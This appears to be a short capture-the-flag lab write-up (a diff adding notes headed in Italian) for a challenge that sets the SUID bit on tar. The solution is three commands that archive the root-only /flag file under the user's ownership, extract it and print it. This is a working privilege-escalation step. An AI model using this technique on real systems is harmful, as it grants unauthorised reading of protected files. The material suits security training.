@@ -1,0 +1,19 @@
+//TESTO
+
+hacker@babysuid_level20:~$ /challenge/babysuid_level20 
+Welcome to /challenge/babysuid_level20!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/tar.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (/challenge/babysuid_level20) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/tar!
+
+//SOLUZIONE
+
+hacker@babysuid_level20:~$ tar cf flag.tar /flag --owner=hacker --group=hacker
+hacker@babysuid_level20:~$ tar -xvf flag.tar
+hacker@babysuid_level20:~$ cat flag
